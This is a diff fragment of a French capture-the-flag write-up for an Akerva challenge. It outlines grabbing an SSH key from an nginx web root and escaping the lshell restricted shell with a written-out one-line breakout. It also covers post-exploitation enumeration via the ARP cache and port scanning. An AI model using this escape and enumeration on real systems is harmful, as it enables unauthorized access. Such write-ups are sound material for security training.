+2. Remarquer qu'il y a __nginx__ installé ;
+3. Dans la configuration du nginx, trouver la racine du _frontend_ : `/usr/share/nginx/dev3.challenge.akerva.com` ;
+4. Récupérer une clé privé SSH dans l'un des dossiers ;
+5. Grâce à l'indice de Akerva, on connait l'utilisateur de la machine distante : __violet__ ;
+6. Attérir dans un environnement restreint : __lshell__ ;
+7. Trouver l'issue de sécurité sur le git permettant de s'échapper de l'environnement restreint : `echo opmd && cd () bash && cd`.
 
 ---
 
-### X.1. State of the art
+### X.1. Post exploitation
 
-Le premier reflexe est de vérifier le cache `arp` :
+Personnellement, l'un de mes premiers reflexes en post exploitation est de vérifier le cache __arp__ :
 
 ```bash
-veruca@SRV01-WEB-WW3:~$ cat /proc/net/arp 
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ cat /proc/net/arp 
 IP address       HW type     Flags       HW address            Mask     Device
 172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
 172.16.69.65     0x1         0x2         96:2e:20:a6:a0:f3     *        ens18
 ```
 
-On a donc une nouvelle IP : `172.16.69.65`
+Une nouvelle IP a été trouvé : `172.16.69.65`. Les identifiants de Veruca 
+
+===
+---
+---
+===
 
 Après avoir essayé de réutiliser les identifiants de veruca sans succès, j'ai décidé de faire un scan de port sur les deux machines :
 
@@ -1784,7 +1866,7 @@ d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
 
 1. __ghantoos__, _lshell - SECURITY ISSUE: Inappropriate parsing of command syntax_, GitHub : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754
 
-## XI. Step 11 - Basic enumeration
+## XI. Step 11 - Free flag
 
 >  Free for all \o/ 
 
